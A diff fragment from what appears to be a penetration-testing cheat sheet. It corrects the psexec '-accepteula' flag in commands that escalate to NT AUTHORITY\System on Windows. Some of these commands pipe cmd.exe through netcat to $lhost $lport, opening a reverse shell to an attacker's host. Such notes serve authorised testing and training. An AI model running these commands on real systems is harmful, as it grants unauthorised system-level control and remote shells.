@@ -441,15 +441,15 @@ nikto -h $url -C all -oX
 * To NTAUTHORITY
     * Escalating to NTAUTHORITY\System:
         ```batch
-        psexec.exe -acceptula -s -u $username cmd
+        psexec.exe -accepteula -s -u $username cmd
         ```
     * Escalating to NTAUTHORITY\System (w/rdp):
         ```batch
-        psexec.exe -acceptula -s -u $username -p $password nc $lhost $lport C:\Windows\System32\cmd.exe
+        psexec.exe -accepteula -s -u $username -p $password nc $lhost $lport C:\Windows\System32\cmd.exe
         ```
     * Escalating to NTAUTHORITY\System (w.o./rdp):
         ```batch
-        psexec.exe -i -s C:\dir\dir\nc.exe $lhost $lport -e  C:\windows\system32\cmd.exe
+        psexec.exe -accepteula -i -s C:\dir\dir\nc.exe $lhost $lport -e  C:\windows\system32\cmd.exe
         ```
     * Escalating to NTAUTHORITY\System: 
         ```batch
